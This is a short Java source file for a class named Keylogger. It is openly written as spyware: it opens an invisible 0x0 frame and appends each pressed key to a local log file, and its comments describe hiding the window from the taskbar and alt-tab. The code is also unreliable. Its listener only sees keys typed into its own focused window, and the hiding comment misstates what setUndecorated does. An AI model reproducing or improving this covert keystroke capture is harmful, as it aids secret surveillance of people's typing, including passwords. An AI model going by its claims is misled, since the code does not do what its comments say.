import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import javax.swing.JFrame;

public class Keylogger extends JFrame implements KeyListener {

    private static final long serialVersionUID = 1L;
    private static final String LOG_FILE = "keystrokes.log";
    private static final Logger LOGGER = Logger.getLogger(Keylogger.class.getName());

    public Keylogger() {
        this.setSize(0, 0); // Set frame size to 0x0 pixels to make it invisible
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.addKeyListener(this);
    }

    @Override
    public void keyTyped(KeyEvent e) {
            // Not used, but required by KeyListener interface
    }

    @Override
    public void keyPressed(KeyEvent e) {

        logKey(e);
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Not used, but required by KeyListener interface
    }

    private void logKey(KeyEvent e) {
        try {
            char keyChar = e.getKeyChar();
            File logFile = new File(LOG_FILE);
            FileWriter writer = new FileWriter(logFile, true);
            writer.write(keyChar);
            writer.flush(); // Flush the buffer to ensure immediate writing
            writer.close();
        } catch (IOException ex) {
            LOGGER.log(Level.SEVERE, "Error writing to log file", ex);
        }
    }

    // Hide the JFrame from the taskbar and alt-tab menu
    private void hideFrame() {
        this.setUndecorated(true);
        this.setVisible(true);
    }

    public static void main(String[] args) {
        // Hide the keylogger window
        Keylogger keylogger = new Keylogger();
        keylogger.hideFrame();

        // Start the keylogger
        keylogger.setVisible(true);
    }
}
